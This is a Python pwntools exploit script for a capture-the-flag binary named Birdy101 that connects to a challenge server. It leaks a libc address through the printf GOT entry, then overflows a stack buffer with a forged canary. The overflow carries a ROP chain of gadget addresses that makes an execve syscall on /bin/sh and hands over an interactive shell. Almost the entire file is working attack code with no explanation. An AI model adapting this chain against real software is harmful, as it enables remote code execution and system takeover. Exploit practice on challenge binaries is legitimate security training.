#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './Birdy101'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'challs.airoverflow.com', 34125

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
# break *0x04014d1
# break *0x040134f
# break *0x0401396
break *0x04013aa
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec Birdy101
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      No PIE (0x400000)

def exploit():
    global io

    io = initialize()

    io.sendafter(b'name?', p64(elf.got['printf']))
    io.recvuntil(b'Welcome ')
    libc.address = u64(io.recvline().strip().ljust(8, b'\x00')) - libc.sym['printf']

    canary = elf.bss() + 0x200
    offset = 264
    payload = flat({
        offset: [
            canary,
            elf.bss() + 0x100,
            libc.address + 0x2a3e5,     # pop rdi; ret;
            next(libc.search(b'/bin/sh\x00')),
            libc.address + 0x045eb0,    # pop rax; ret;
            0x3b,
            libc.address + 0x02be51,    # pop rsi; ret;
            0x0,
            libc.address + 0x11f2e7, # pop rdx; pop r12; ret
            0x0,
            0x0, 
            libc.address + 0x29db4, # syscall
            # libc.sym['system'],
        ]
    })
    payload += p64(canary) * ((0x950 - len(payload)) // 8)

    # payload += cyclic(0x7d8 - len(payload))
    # payload += p64(canary)
    # payload += cyclic(0x130)
    # payload += p64(elf.bss() + 0x100 - 0x972)
    # payload += cyclic(0x928 - len(payload))
    # payload += p64(canary)

    io.sendlineafter(b'store:', payload)

    log.success('libc base: %#x', libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()